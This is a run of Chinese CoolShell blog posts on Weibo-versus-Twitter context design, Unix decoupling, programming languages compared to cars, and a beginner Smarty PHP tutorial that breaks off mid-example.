# 介绍陈皓以前的blog在CSDN——http://blog.csdn.net/haoel，08、09年的时候，CSDN的博客系统很不稳定，另外，正好有一台N年前的托管的服务器，所以，就申请了域名，陈皓（左耳朵耗子）建立自己的Blog。本站为什么叫“酷壳”，绝属误打误撞。原来的域名是：CoCre.com，原意是Corporation+Creative两个单词的缩写，是陈皓一大学同学申请的，后来他出国了，所以，我就把这个域名用来做成我的Blog了，把CoCre按发音读成“酷壳”和“酷客”，但感觉不好记，于是注册了CoolShell.cn，感觉这个可能更好记一点。要说“酷壳”有什么意思，在这里我可以说，完全没有，就是一个名字罢了。这是一个完全依靠个人建立的技术性BLOG。是一个分享技术见闻，知识，趋势的网站，这是我个人建立的网站，如果你喜欢其中的文章呢，欢迎给我们留言，如果不想留言呢，你也可以通过打分来鼓励我们分享和写作。当然，我们最欢迎的是你的加入，欢迎你和我们一起写作。欢迎大家注册并加入我们一起来分享编程和技术方面的见闻和心得。文章可以是原创，翻译、杂谈，灌水，只要是和技术和编程相关就可以。
陈皓以前的博客在CSDN（http://blog.csdn.net/haoel），目前已不更新，博客全面转到酷壳：http://CoolShell.cn，陈皓基本不会在微信公众号上写文章。陈皓，左耳朵耗子有20年软件开发相关工作经验，10年以上项目和团队管理经验。擅长底层技术架构，团队建设，软件工程，软件研发咨询，以及全球软件团队协作管理。对高性能，高可用性，分布式，高并发，以及大规模数据处理系统有一些经验和心得。喜欢关注底层技术平台和互联网行业应用。技术擅长C/C++/Java和Unix/Linux/Windows。曾于Amazon中国任研发经理，负责电子商务全球化业务（全球开店）和全球库存预测系统的研发。曾在阿里巴巴北京研发中心、商家业务部曾任资深专家一职，负责电商云平台、开放平台，云监控和电商多媒体平台。曾在阿里巴巴核心系统专家组从事阿里核心系统和阿里云ECS相关的虚拟化平台的开发工作。现在创业中，MegaEase创始人，致力于为企业的高并发高可用架构提供一整套的技术解决方案和产品# 国内微博和Twitter的最大不同作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn
霍炬近两个月前写过一篇《microblogging和微博信息架构产品差距和影响》分析了国内微博和Twitter的差距，重点就是因为信息的平等性。我也一直在观察新浪微博，以及新浪和Twitter的一些功能上的差别。发现了一些东西，想在这里和大家分享一下。我的见解达不到像霍炬那样的层次，作为一个技术人员，我只能在产品功能上做些分析。欢迎大家指正。目录* 现实状况   * SNS中的上下文   * 上下文造假   * 其它#### 现实状况国内的微博就是新浪，Sohu微博，腾讯微博，以及饭否。我们不难发现：* 搜狐的和腾讯的就是Copy新浪的。在Following和Followed上大家都有自己所谓的“创新”   * 饭否是在Copy Twitter，这点太明显了，不过，抄在了表面，而且相当的怪。国内所有的这些以Twitter为蓝本干出来的这些东西，其和Twitter在核心功能上有这些差别：* Twitter的Retweet一点信息都加不上，国内的微博的转发需要加上自己的评论，也就形自己的信息。   * Twitter的Reply只会有一个@原来的人，国内的Reply也很相似，只是勾上转发后就会把Reply的东西以“ **//@XXX** ”的方式成为自己的信息。   * 饭否的做法比较怪，转发加原文（想做成新浪的样子），回复不加原文，只有@（Twitter）的样子，可见饭否的分裂。
#### SNS中的上下文这段时间，我一直在想，新浪为什么要做成这样，为什么不做成Twitter那样，或者，为什么Twitter做成那样而不是新浪这样？从表面上看上去， **新浪的“ 回复+转发”会带被回的信息，而Twitter的回复不带上下文，Twitter上一些我fo的人的话题完全看不懂，不像新浪的还能看到上文**。老实说，在一开始，我还觉得新浪微博这种用法和技术上要比 Twitter 要强大，现在看来是我当时对Twitter并不熟悉。经过这段时间的观察。 **我恰恰发现新浪在转发和回复上都要带上原文其实是一件很没有技术含量的事** 。要说清这个事，请让我说一下评论和回复的事。* 我们网上讨论一个事的时候，你会发现，一个主题下的讨论会对回复的话题进行讨论而偏题，甚至会发散出多条讨论线各自发展。这种事会造成讨论的混乱。所以，上下文是关键。   * BBS和Wordpress可以使用“引用”或“回复”来让你的话题有上下文。新浪的博客和新闻评论里没有，只是网易的评论可以盖楼。所以新浪微博基本上采用的就是这样的方式。然而，Twitter则不是，Twitter的回复系统是不会像新浪那样加上“ **//@XXX** ”的东西的，如果你要看信息的上下文，你需要点击信息，在右边栏会出现其上下文列表。 **Twitter的这个功能可以让你很容易地找到一个信息链，而不受别的信息链的干扰，不像国内微博那样——多个信息链穿插成一锅粥让你无法阅读** （饭否是抄Twitter抄的最像的，但是其没有实现这个功能）。
#### 上下文造假国内的所有微博都做不到这个事，我估计是因为技术不行。所以，为了加上上下文，他们只能做成今天你看到的这个样子。你也许会想和我争论，这样在阅读体验上更好。但是，如果你看过下面这个例子，你一定就不会这么想了。在新浪微博上，我们转发或是回复时，我们可以人为地加上这样的上下文（说白了，就是造假）：> > //@姚晨：八顿也会C语言。//@任志强：不是C++才牛吗？ > //@李承鹏：代表盲肠封你为程序员的脊梁。//@苍井空：还要爱吃空心菜的菜。 > //@李开复：成功的程序员的标志：1）用C语言，2）不用IE6，3）无需敏捷咨询师。看到这个，你明白为什么Twitter要那样，而不是新浪这样了吧？！ **这就是差距，至少是产品经理的差距** 。我个人觉得还有技术上的差距。如果某人给你发来的一条手机短信你都搞不清楚是不是这个人说的，那会是多么恐怖的事。**有人说，在Twitter上也可以造假，但是这需要用户自己去干，Twitter的系统并不会主动干这个。 Twitter的Retweet和Reply是可以区分用户行为和系统行为（就看你加不加原信息），而新浪微博则无法区系统行为和用户行为，这就是国内微博的软肋！**
#### 其它新浪的东西其实挺没创意的，微软用新浪在当过反面教材，某WEB设计师也用新浪来当过反面教材。不过，新浪微博还是很强大的，尤其是删贴和阻止信息传播上，经过观察，的确很强大。我把我这篇文章里的那个欺诈示例转到了我的微博（@左耳朵耗子）做了个测试。结果，在有这篇文章做提示的情况下，还是有些人相信了，还有些人骂我并把我取消关注和拉黑了。我真是服了，我故意造得这么假这么娱乐，结果还是有些人认真了。你说那些骗子看到这个情况岂不是开心之极啊。再次说明新浪微博的这种上下文的方式弊端！（ **转载请注明作者和出处** ）# 程序员的圣诞节作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn程序员Román Cortés用1021个字节写了一个3D 的圣诞树，很强大。（请使用Chrome浏览器查看），还记得本站介绍的那个叫js1k.com的网站吗？!Christmas Tree其原理如下所示：!-!-!-!-!-!-——————————————还有另外一个叫Dustin DeWeese程序员，也做了一个贺卡给大家（请点下面的链接）。这个贺卡需要向下滚动网页才能看得出效果来，no Javascript。
这种使用遮罩而产生的动画的东西确实很有意思：，有一个小工具可以用来创建这样的东西：http://dl.dropbox.com/u/15095913/Scanimation_Creation_v1.1.zip呵呵。挺有意思的吧。# 用Unix的设计思想来应对多变的需求作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn之前，@风枫峰 在“这是谁的错？”中说过开发团队对需求来者不拒，而@weidagang 也在“需求变更和IoC”中说过用IoC来最大程度地解决需求变更。今天我也想从Unix设计思想的角度来说说什么是好的软件设计，什么样的设计可以把需求变更对开发的影响降低。（ **注意** ：这并不能解决用户或是PM的无理需求，面对无理需求，需要仔细分析需求，而用技术的手段无法搞定这个事，但是可以减轻需求变更带来的痛苦） 我曾经在《Unix传奇》的下篇中写过一些Unix的设计哲学和思想（这里重点推荐大家看一下《 _The Art of Unix Programming_ 》，我推荐过多次了），以前也发过一篇《一些软件设计的原则》，不过，这些东西都太多了，记不住。其实，这么多年来，我的经验告诉我， **无论是Unix设计，还是面向对象设计，还是别的什么如SOA，ECB，消息，事件，MVC，网络七层模型，数据库设计，等等，他们都在干三件事—— 解耦，解耦，还是解耦！**所谓解耦，就是让软件的模块和模块间尽量少地依赖起来。
#### 现实当中的例子让我先举几个现实生活中的例子：1、现实社会中，制造灯具的工厂完全不关心制造灯泡的工厂，制造灯泡的工厂完全不关心制造灯具的工厂，但是，灯泡和灯饰可以很完美地组合成用户所喜欢的样子（这和@weidagang 在“需求变更和IoC”说到的那个PC的例子相仿）。他们是怎么做到的？2、互联网上，做网站的人完全不用关心用户在用什么样的操作系统，什么样的客户端浏览器（当然事实上，浏览器的不标准让网站那边很头痛，这里只是举个例），反过来，上网的人也不关心做网站的人在用什么的技术开发网站。但是大家在完全不关心对方的情况下，可以很正常地协同工作在一起。为什么？这样的例子太多了。为什么可以做成这样呢？因为大家依赖的是一个接口，灯具和灯泡并不互相依赖，他们依赖的是一个接口，做网站的人和浏览网站的人依赖的还是接口——HTTP协议。这就是面向对象的核心思想——依赖于接口而不是实现，这就是解耦。 **当你看过这两个例子以后，我希望你以后设计的软件至少不能比我们现实社会中的这些方法要差** 。不然，你就是在让社会倒退了，呵呵。 你会说，这和Unix，和应对需求变化有什么关系？好让我们再来看一下Unix的设计。
#### Unix设计的例子下面是几个Unix下的例子：1、Unix下，所有的硬件都可以通过文件的方式存取。其统统在/dev下。于是，软件和硬件的耦合被解开了，操作系统只需要把硬件统统变成文件，而程序只需要使用三个东西，一个是fd，一个是read()，一个是write()，就可以来操作任意的硬件了，这就是抽象，简单到不行。2、Unix下，所有的命令都可以用管道串起来（管道绝对是个伟大的发明），这样，所有的命令间的交互全部解耦到只依赖于STD_IN, STD_OUT设备上。最酷的是，用户可以使用管道任意地拼装那些命令，以完成各式各样的功能。管道这个设计思想可以映射为今天的Web Service，你可以任意地拼装各种Web Service。看到这里，你会发现，这还是解耦，本质上来说，也是一种依赖倒置——OOD的精髓。但是，Unix还不仅仅是这些。我们再来看几个例子：1、Unix下，软件都是绿色地安装。在iOS上更明显——各个程序间基本上互不干扰，这个程序产生的垃圾文件不会影响到另一个程序。你删掉一个程序不会让另一个程序不举，各是各的空间。你可以删除这些程序，只要把内核心留着，系统照样可以启动。
2、Unix下，你可以通过设置一些环境变量，让多种环境同时存在，比如：某个LAMP用的是Apache 2.0, Mysql 4.0, PHP 4.0，某个LAMP用的是Apache 2.2, Mysql 5.0，PHP5.3，你不但可以方便地在系统中切换这两个环境，你甚至还可以同时启动他们。3、Unix下，你可以随意地替换你想要的程序。比如，你不喜欢bash，你可以替换成ksh/csh等，你不喜欢awk ，你可以替换成 gawk ，所有的东西都像零件一样，你不喜欢什么，你就可以替换什么。这三个例子告诉了我们—— **当你把你的软件设计地耦合度非常地低时，你可以随意地组合，随意地安排你的系统** 。相当的灵活，灵活到Windows到今天都学不会。#### 应对需求变化看到这里，你可能明白我想说的是什么了，你可能开始觉得怎么样的系统设计会更有效了。如果你还记得《Steve Y 对平台的长篇大论》，你就会知道我想说什么了。是的，我想说的就是， **当你真正了解了Unix的设计思想后，你会觉得今天的很多东西都是对Unix设计思想的一种传承或是变种** 。这种东西就是：1） **解耦，解耦，解耦** 。尽量地让你的模块不要在实现上耦合，而是耦合某个规范，某个标准。
2） **KISS，KISS，KISS** 。要做到高度解耦，你的模块就一定要很简单，当然不是说简单到只有几行代码，而是简单到只干一件事，并把这件事干到极致。然后通过某个标准拼装起来。3） **拼装，拼装，拼装。** 我想不起来是谁说的了，这句话是这样的，当我想用一个模块的时候，我直接调用就好了，没有必要像C或Java一样，还要编译。是的，拼装需要一个框架，需要一种标准协议，然后让所有的系统都耦合在这种规范上，各自独立运行，就像一个机器上的各个部件一样，当我觉得这个部件不爽，换了就是了。（例如，当我们在尝试不同的算法的时候）想想建材和家俱市场，无论用户过来想装修什么，我都可以满足用户的不同需求，只要你是和家装相关，我基本上都能满足你，不是吗？无论你怎么变，只要不变态，我基本上都可以满足你。这就是解耦，拼装带来的好处。 你可能会说我说得太简单了，另一方面，你可能觉得有一些系统这样做没必要，我承认，不过，你可以有选择的或多或少地试试。（其实，我相信你已经在不自觉得或多或少地使用这种方式开发软件了） （全文完）*[W3C]: World Wide Web Consortium   *[VML]: Vector Markup Language
# 编程语言汽车作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**!Oscar Mayer Wienermobile**以前酷壳发布过《操作系统航空公司》戏谑了一下如果操作系统是航空公司会怎么样的一种情况。现在，我们来YY一下编程语言，如果编程语言是汽车，又会怎么样？* **Ada** 这是一辆坦克。一个很厚重但很丑的坦克，从不会崩溃。如果你告诉别人你正在驾驶Ada，别人会狂笑不已。但是，你会开着一辆跑车去打战吗？[from Amit Dubey] * **汇编语言** 只是一个祼露在外的引擎。你不得不自己去造车，并向其提供汽油，但你在驾车时要小心，因为他会像一只从地狱放出来的蝙蝠一样。其实，对于汇编语言，你自己才是车。[From “Subterfug” off digg.com:] * **Basic** 是一辆很简单的车，对于一些短途的交通比如去一些超市商店，他是很有用的。以前这是一个对初学者很流行的车，然而，近来它蜕变成脚本，而更新的车型被抛光以应对长途旅程，但那也只是新瓶装旧酒。[from Przemyslaw Wrzos] * **C** 是一辆赛车，它的速度是令人难以想象的快，可惜的是它每50公里就会损毁一次。 * **Cobol** 号称是一辆车，但是，没有哪个“有自尊的司机”会承认以前驾驶过它。 * **C#** 是一个竞争性的家庭旅行车。一旦你开始使用，你就别想再使用别的竞争者的产品了。 * **C++** 是一个加大马力的C赛车，其有一堆新增的功能，而且，它只会每250公里损毁一次。可是，一旦它有故障，没人会知道故障发生在哪里。
* **Eiffel** 是一个车，其包括了一个法国口音的内建的驾驶讲师。他会帮你很快的识别你的错误，但是你不能和他争，不然，他会凌辱你后毫不迟疑地把你扔到窗外。[From Daniel Prager ] * **Erlang** 是一个汽车车队，你想去哪它都会非常合作。你只需要用一只脚就可以开动好几辆车。但是，一旦你学会了如何在它给你设计的地形上驾驶，你就会很难在别的地形上驾驶了。另外，由于你一次驾驶好几辆车，所以，就算是其中几车损毁了也无关紧要。 * **Forth** 是一辆你通过一些工具可以自己造出来的车。你的这个车不需要像别的车。然后，一辆Forth 车只有倒档。[By “256byteram”, on a comment on Digg.com ] * **Fortran** 是一个非常漂亮的老爷车。它可以走得很快，但条件是那是一条很直的路，而且路上只有你自己。我们相信，学习去驾驶一辆Fortran车，你就可能去学习别的车型。 * **Java** 也是一个家用旅行车，很容易驾驶，但不是很快，而且这是一个你无法伤害自己的车。 * **Haskell** 是一个令人难以想象的超完美设计的相当漂亮的车，有谣言说，这是一辆要可以行驶在极端怪异地形上的车。有一天，你尝试着要去开它，但你发现它并不是顺着路行驶，而是，它把自己和道路都复制了很多份，每一个道路的复制品上都有一辆车，而这些车的位置都比前一个要往前一些。按理来说，我们可以更便捷地驾驶它，但你却对数据不是很懂，所以，你不知道怎么做。   [Monadic 版:] **Haskell** 并不是一个真正的车。这是一个抽象机器，你需要给足你是怎么去驾驶汽车的流程描述。你不得不把这些抽象机器放到某一个真实的机器中，这样它才能真正的行驶。你并不需要知道，那个真实的机器是怎么工作的。而且，我们还可以把多个抽象机器作成一个抽象机器，这样，当你把其放进真实机器中时，你就能去很多地方了。
* **Lisp** 看上去像一辆车，但你只需要调整，你可把它变成一个飞机或是一个潜水艇。[from Paul Tanimoto:] 首先，这看起来并不像一辆车，但是你会发现还是有人在开他四处走。在你决定去学习驾驶它后，你会意识到这是一辆你可以制造更多的车的车。你告诉你的朋友，但你的朋友们嘲笑你说这个车看起来太怪异了。但就算是这样，你还是始终在你的车库中放着一辆Lisp，并希望有一天你的朋友会开关他到街上。 * **Mathematica** 是一个设置精良的车，其从Lisp借鉴了很多但却没有得到应得的声望。它可以知道什么才是到达目的地最有效的道路，但是那需要运气。 * **Matlab** 是一辆设计给新手司机使用的车，它过可用作一些短途用途，而且，适合它的地形也不多，和是那些“数学车”适合的地形差不多。在这种地面上，驾驶它是非常舒服的，但是一旦你离开适合它的地形，就算是一小辆Matlab的车也会变得很难驾驶。而很多专业的司机都拒绝承认这是一辆车。 * **Ocaml** 是一个很性感的欧洲车。它并不像 **C** 一样的快，但他永远不会被损毁。然后，这是法国式的，所有的控制装置都不在正常的位置。 * **Perl** 本来应该是一个很酷的车，但是它的驾驶员手册相当的难以理解。另外，即使你能搞懂如何驾驶Perl车，你也不能去驾驶别的车。 * **PHP** 是一个 Oscar Mayer Wienermobile（见本文文章头上的图片），它是一个很怪异的车，但是还是有很多的人喜欢去驾驶它。 [from “CosmicJustice” off of digg.com]
* **Prolog** 是一个完全自动化的车：你只要告诉它目的地是什么样的，它就可以带着你去那。[附录 from Paul Graham:] 然而，说明目的地的工作量和你自己开车到那里的工作时是一样的。[另一个版本] **Prolog** 这个车有一个独一无二的GPS装置。它会去为你寻找你要到的目的地，如果到了路的尽头还没有找到，那么，他会回来然后再去试另一条路，直到找到你的目的地为止。 * **Python** 是一个相当不错的入门者的车。你没有驾照也可以驾驶它。除非，你真的想把它开得很快，或是在很BT的地形上驾驶。有了它，你可能不再需要别的车。 * **Ruby** 是一个把Perl, Python和Smalltalk三辆车混合起来的一辆拼装车。一个日本的技师找到了Perl, Python和Smalltalk一些碎片并把这些碎片拼成成了一辆车。很多司机认为这个拼装车比其它三个全部加起来都好。而其它一些司机却喃喃道，这个车提供了很多重复的功能，甚至是三重一样的功能，这些重复的功能在不固定的环境下却又有一些细小的不同，这些重复的功能让这个车更难驾驶。有谣言说Ruby这个车要重新设计。 * **Smalltalk** 只是一个小型车，其原来的目的只是为了让大家学习驾驶。但是，这个车设计的太好了，就算是很有经验的老手也很喜欢驾驶它。它开起来并不是很快，但是你可以把这个车的各个部件全部解开，并且换上你像要的部件，或是组装成你喜欢的样子。你可以给他发一个短信告诉它你要去哪，它会带着你去那，或是告诉你它听不懂你在说什么。很人性化的一辆车。 * **Visual Basic** 这是一辆驾驭你的车。 [from “yivkX360” on digg.com]
文章：来源*[W3C]: World Wide Web Consortium   *[VML]: Vector Markup Language# 菜鸟学PHP之Smarty入门作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn刚开始接触模版引擎的 PHP 设计师，听到 Smarty 时，都会觉得很难。其实笔者也不例外，碰都不敢碰一下。但是后来在剖析 XOOPS 的程序架构时，开始发现 Smarty 其实并不难。只要将 Smarty 基础功练好，在一般应用上就已经相当足够了。当然基础能打好，后面的进阶应用也就不用怕了。这篇文章的主要用意并非要深入探讨 Smarty 的使用，这在官方使用说明中都已经写得很完整了。笔者仅在此写下一些自己使用上的心得，让想要了解 Smarty 却不得其门而入的朋友，可以从中得到一些启示。就因为这篇文章的内容不是非常深入，会使用 Smarty 的朋友们可能会觉得简单了点。**Smarty介绍什么是模版引擎**不知道从什么时候开始，有人开始对 HTML 内嵌入 Server Script 觉得不太满意。然而不论是微软的 ASP 或是开放源码的 PHP，都是属于内嵌 Server Script 的网页伺服端语言。因此也就有人想到，如果能把程序应用逻辑 (或称商业应用逻辑) 与网页呈现 (Layout) 逻辑分离的话，是不是会比较好呢？
其实这个问题早就存在已久，从交互式网页开始风行时，不论是 ASP 或是 PHP 的使用者都是身兼程序开发者与视觉设计师两种身份。可是通常这些使用者不是程序强就是美工强，如果要两者同时兼顾，那可得死掉不少脑细胞…所以模版引擎就应运而生啦！模版引擎的目的，就是要达到上述提到的逻辑分离的功能。它能让程序开发者专注于资料的控制或是功能的达成；而视觉设计师则可专注于网页排版，让网页看起来更具有专业感！因此模版引擎很适合公司的网站开发团队使用，使每个人都能发挥其专长！就笔者接触过的模版引擎来说，依资料呈现方式大概分成：需搭配程序处理的模版引擎和完全由模版本身自行决定的模版引擎两种形式。在需搭配程序处理的模版引擎中，程序开发者必须要负责变量的呈现逻辑，也就是说他必须把变量的内容在输出到模版前先处理好，才能做 assign 的工作。换句话说，程序开发者还是得多写一些程序来决定变量呈现的风貌。而完全由模版本身自行决定的模版引擎，它允许变量直接 assign 到模版中，让视觉设计师在设计模版时再决定变量要如何呈现。因此它就可能会有另一套属于自己的模版程序语法 (如 Smarty) ，以方便控制变量的呈现。但这样一来，视觉设计师也得学习如何使用模版语言。
模版引擎的运作原理，首先我们先看看以下的运行图：一般的模版引擎 (如 PHPLib) 都是在建立模版对象时取得要解析的模版，然后把变量套入后，透过 parse() 这个方法来解析模版，最后再将网页输出。对 Smarty 的使用者来说，程序里也不需要做任何 parse 的动作了，这些 Smarty 自动会帮我们做。而且已经编译过的网页，如果模版没有变动的话， Smarty 就自动跳过编译的动作，直接执行编译过的网页，以节省编译的时间。**使用Smarty的一些概念**在一般模版引擎中，我们常看到区域的观念，所谓区块大概都会长成这样：   <!– START : Block name –>   区域内容   <!– END : Block name –>这些区块大部份都会在 PHP 程序中以 if 或 for, while 来控制它们的显示状态，虽然模版看起来简洁多了，但只要一换了显示方式不同的模版， PHP 程序势必要再改一次！在 Smarty 中，一切以变量为主，所有的呈现逻辑都让模版自行控制。因为 Smarty 会有自己的模版语言，所以不管是区块是否要显示还是要重复，都是用 Smarty 的模版语法 (if, foreach, section) 搭配变量内容作呈现。这样一来感觉上好象模版变得有点复杂，但好处是只要规划得当， PHP 程序一行都不必改。
由上面的说明，我们可以知道使用Smarty 要掌握一个原则：将程序应用逻辑与网页呈现逻辑明确地分离。就是说 PHP 程序里不要有太多的 HTML 码。程序中只要决定好那些变量要塞到模版里，让模版自己决定该如何呈现这些变量 (甚至不出现也行) 。**Smarty的基础安装Smarty**首先，我们先决定程序放置的位置。Windows下可能会类似这样的位置：「 d:\appserv\web\demo\ 」。Linux下可能会类似这样的位置：「 /home/jaceju/public_html/ 」。到Smarty的官方网站下载最新的Smarty套件：http://smarty.php.net。解开 Smarty 2.6.0 后，会看到很多档案，其中有个 libs 资料夹。在 libs 中应该会有 3 个 class.php 檔 + 1 个 debug.tpl + 1 个 plugin 资料夹 + 1 个 core 资料夹。然后直接将 libs 复制到您的程序主资料夹下，再更名为 class 就可以了。就这样？没错！这种安装法比较简单，适合一般没有自己主机的使用者。至于 Smarty 官方手册中为什么要介绍一些比较复杂的安装方式呢？基本上依照官方的方式安装，可以只在主机安装一次，然后提供给该主机下所有设计者开发不同程序时直接引用，而不会重复安装太多的 Smarty 复本。而笔者所提供的方式则是适合要把程序带过来移过去的程序开发者使用，这样不用烦恼主机有没有安装 Smarty 。
**程序的资料夹设定**以笔者在Windows安装Appserv为例，程序的主资料夹是「d:\appserv\web\demo\」。安装好Smarty后，我们在主资料夹下再建立这样的资料夹：在 Linux 底下，请记得将 templates_c 的权限变更为 777 。Windows 下则将其只读取消。**第一个用Smarty写的小程序**我们先设定 Smarty 的路径，请将以下这个档案命名为 main.php ，并放置到主资料夹下：main.php:<?php     include "class/Smarty.class.php";     define('__SITE_ROOT', 'd:/appserv/web/demo'); // 最后没有斜线     $tpl = new Smarty();     $tpl->template_dir = __SITE_ROOT . "/templates/";     $tpl->compile_dir = __SITE_ROOT . "/templates_c/";     $tpl->config_dir = __SITE_ROOT . "/configs/";     $tpl->cache_dir = __SITE_ROOT . "/cache/";     $tpl->left_delimiter = '<{';     $tpl->right_delimiter = '}>';     ?>
照上面方式设定的用意在于，程序如果要移植到其它地方，只要改 __SITE_ROOT 就可以啦。 (这里是参考 XOOPS 的 )Smarty 的模版路径设定好后，程序会依照这个路径来抓所有模版的相对位置 (范例中是 ‘d:/appserv/web/demo/templates/’ ) 。然后我们用 display() 这个 Smarty 方法来显示我们的模版。接下来我们在 templates 资料夹下放置一个 test.htm：(扩展名叫什么都无所谓，但便于视觉设计师开发，笔者都还是以 .htm 为主。)templates/test.htm:<html>     <head>     <meta http-equiv="Content-Type" content="text/html; charset=big5">     <title><{$title}></title>     </head>     <body>     <{$content}>     </body>     </html>现在我们要将上面的模版显示出来，并将网页标题 ($title) 与内容 ($content) 更换，请将以下档案内容命名为 test.php ，并放置在主资料夹下：
test.php:<?php     require "main.php";     $tpl->assign("title", "测试用的网页标题");     $tpl->assign("content", "测试用的网页内容");     // 上面两行也可以用这行代替     // $tpl->assign(array("title" => "测试用的网页标题", "content" => "测试用的网页内容"));     $tpl->display('test.htm');     ?>请打开浏览器，输入 http://localhost/demo/test.php 试试看(依您的环境决定网址)，应该会看到以下的画面：再到 templates_c 底下，我们会看到一个奇怪的资料夹 (%%179) ，再点选下去也是一个奇怪的资料夹 (%%1798044067) ，而其中有一个档案：templates_c/%%179/%%1798044067/test.htm.php:<?php /* Smarty version 2.6.0, created on 2003-12-15 22:19:45 compiled from test.htm */ ?>     <html>     <head>     <meta http-equiv="Content-Type" content="text/html; charset=big5">     <title><?php echo $this->_tpl_vars['title']; ?></title>     </head>     <body>     <?php echo $this->_tpl_vars['content']; ?>     </body>     </html>
没错，这就是 Smarty 编译过的档案。它将我们在模版中的变量转换成了 PHP 的语法来执行，下次再读取同样的内容时， Smarty 就会直接抓取这个档案来执行了。最后我们整理一下整个 Smarty 程序撰写步骤：Step 1. 加载 Smarty 模版引擎。Step 2. 建立 Smarty 对象。Step 3. 设定 Smarty 对象的参数。Step 4. 在程序中处理变量后，再用 Smarty 的 assign 方法将变量置入模版里。Step 5. 利用 Smarty 的 display 方法将网页秀出。**如何安排你的程序架构**上面我们看到除了 Smarty 所需要的资料夹外 (class 、 configs 、 templates 、 templates_c) ，还有两个资料夹： includes 、 modules 。其实这是笔者模仿 XOOPS 的架构所建立出来的，因为 XOOPS 是笔者所接触到的程序中，少数使用 Smarty 模版引擎的架站程序。所谓西瓜偎大边，笔者这样的程序架构虽没有 XOOPS 的百分之一强，但至少给人看时还有 XOOPS 撑腰。includes 这个资料夹主要是用来放置一些 function 、 sql 檔，这样在 main.php 就可以将它们引入了，如下：
main.php:<?php     include "class/Smarty.class.php";     define('__SITE_ROOT', 'd:/appserv/web/demo'); // 最后没有斜线     // 以 main.php 的位置为基准     require_once "includes/functions.php";     require_once "includes/include.php";     $tpl = new Smarty();     $tpl->template_dir = __SITE_ROOT . "/templates/";     $tpl->compile_dir = __SITE_ROOT . "/templates_c/";     $tpl->config_dir = __SITE_ROOT . "/configs/";     $tpl->cache_dir = __SITE_ROOT . "/cache/";     $tpl->left_delimiter = '<{';     $tpl->right_delimiter = '}>';     ?>
modules 这个资料夹则是用来放置程序模块的，如此一来便不会把程序丢得到处都是，整体架构一目了然。上面我们也提到 main.php ，这是整个程序的主要核心，不论是常数定义、外部程序加载、共享变量建立等，都是在这里开始的。所以之后的模块都只要将这个档案包含进来就可以啦。因此在程序流程规划期间，就必须好好构思 main.php 中应该要放那些东西；当然利用 include 或 require 指令，把每个环节清楚分离是再好不过了。在上节提到的 Smarty 程序 5 步骤， main.php 就会帮我们先将前 3 个步骤做好，后面的模块程序只要做后面两个步骤就可以了。**从变量开始**如何使用变量从上一章范例中，我们可以清楚地看到我们利用 <{ 及 }> 这两个标示符号将变量包起来。预设的标示符号为 { 及 } ，但为了中文冲码及 Javascript 的关系，因此笔者还是模仿 XOOPS ，将标示符号换掉。变量的命名方式和 PHP 的变量命名方式是一模一样的，前面也有个 $ 字号 (这和一般的模版引擎不同)。标示符号就有点像是 PHP 中的 <?php 及 ?> (事实上它们的确会被替换成这个) ，所以以下的模版变量写法都是可行的：
2\. <{ $var }> <!– 和变量之间有空格 –>}> <!– 启始的标示符号和结束的标示符号不在同一行 –>   在 Smarty 里，变量预设是全域的，也就是说你只要指定一次就好了。指定两次以上的话，变量内容会以最后指定的为主。就算我们在主模版中加载了外部的子模版，子模版中同样的变量一样也会被替代，这样我们就不用再针对子模版再做一次解析的动作。而在 PHP 程序中，我们用 Smarty 的 assign 来将变量置放到模版中。 assign 的用法官方手册中已经写得很多了，用法就如同上一节的范例所示。不过在重复区块时，我们就必须将变量做一些手脚后，才能将变量 assign 到模版中，这在下一章再提。**修饰你的变量**上面我们提到 Smarty 变量呈现的风貌是由模版自行决定的，所以 Smarty 提供了许多修饰变量的函式。使用的方法如下：<{变量|修饰函式}> <!– 当修饰函式没有参数时 –><{变量|修饰函式:”参数(非必要，视函式而定)”}> <!– 当修饰函式有参数时 –>   范例如下：<{$var|nl2br}> <!– 将变量中的换行字符换成 <br /> –>
<{$var|string_format:”%02d”}> <!– 将变量格式化 –>   好，那为什么要让模版自行决定变量呈现的风貌？先看看底下的 HTML ，这是某个购物车结帐的部份画面。<input name=”total” type=”hidden” value=”21000″ />总金额：21,000 元   一般模版引擎的模版可能会这样写：<input name=”total” type=”hidden” value=”{total}” />总金额：{format_total} 元   它们的 PHP 程序中要这样写：<?php     $total = 21000;     $tpl->assign("total", $total);     $tpl->assign("format_total", number_format($total));     ?>而 Smarty 的模版就可以这样写： (number_format 修饰函式请到Smarty 官方网页下载)<input name=”total” type=”hidden” value=”<{$total}>” />
总金额：<{$total|number_format:””}> 元   Smarty 的 PHP 程序中只要这样写：<?php     $total = 21000;     $tpl->assign("total", $total);     ?>所以在 Smarty 中我们只要指定一次变量，剩下的交给模版自行决定即可。这样了解了吗？这就是让模版自行决定变量呈现风貌的好处！**控制模版的内容重复的区块**在 Smarty 样板中，我们要重复一个区块有两种方式： foreach 及 section 。而在程序中我们则要 assign 一个数组，这个数组中可以包含数组数组。就像下面这个例子：首先我们来看 PHP 程序是如何写的：test2.php:<?php     require "main.php";     $array1 = array(1 => "苹果", 2 => "菠萝", 3 => "香蕉", 4 => "芭乐");     $tpl->assign("array1", $array1);     $array2 = array(     array("index1" => "data1-1", "index2" => "data1-2", "index3" => "data1-3"),     array("index1" => "data2-1", "index2" => "data2-2", "index3" => "data2-3"),     array("index1" => "data3-1", "index2" => "data3-2", "index3" => "data3-3"),     array("index1" => "data4-1", "index2" => "data4-2", "index3" => "data4-3"),     array("index1" => "data5-1", "index2" => "data5-2", "index3" => "data5-3"));     $tpl->assign("array2", $array2);     $tpl->display("test2.htm");     ?>
而模版的写法如下：templates/test2.htm:<html>     <head>     <meta http-equiv="Content-Type" content="text/html; charset=big5">     <title>测试重复区块</title>     </head>     <body><pre>     利用 foreach 来呈现 array1     <{foreach item=item1 from=$array1}>     <{$item1}>     <{/foreach}>     利用 section 来呈现 array1     <{section name=sec1 loop=$array1}>     <{$array1[sec1]}>     <{/section}>     利用 foreach 来呈现 array2     <{foreach item=index2 from=$array2}>     <{foreach key=key2 item=item2 from=$index2}>     <{$key2}>: <{$item2}>     <{/foreach}>     <{/foreach}>     利用 section 来呈现 array1     <{section name=sec2 loop=$array2}>   